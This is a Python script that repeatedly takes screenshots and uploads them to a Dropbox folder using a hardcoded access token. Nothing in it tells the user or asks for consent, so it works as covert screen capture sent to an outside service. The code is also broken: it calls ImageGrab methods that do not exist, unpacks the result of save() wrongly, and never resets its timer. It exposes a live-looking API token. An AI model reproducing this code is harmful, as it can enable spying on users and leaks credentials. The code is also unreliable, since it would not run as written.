from PIL import ImageGrab
import time
import random
import dropbox

current_time= time.time()

def screenshot():
    number= random.randint(0,100)
    myscreen= ImageGrab.grab(0)
    result= True

    while(result):
        image_name= "screenshot"+ str(number)+ ".png"
        ret,frame= myscreen.save(image_name)
        ImageGrab.imwrite(image_name,frame)
        result= False
    
    myscreen.release()
    ImageGrab.destroyAllWindows()
    return image_name
    print("screenshot taken")

def uploadfile(image_name):
    access_token= "Co7om40carEAAAAAAAAAAT39_PdwuzZSKlunrrjjrJ1fMDnlDY5J_WgajMcff11d"
    source= image_name
    destination= "/screenshot/"+image_name
    dbx= dropbox.Dropbox(access_token)
    file=open(source,"rb")
    dbx.files_upload(file.read(),destination,mode=dropbox.files.WriteMode.overwrite)
    print("file uploaded")
       
def main():
    while(True):
        if((time.time()- current_time)>= 5):
            name= screenshot()
            uploadfile(name)

main()

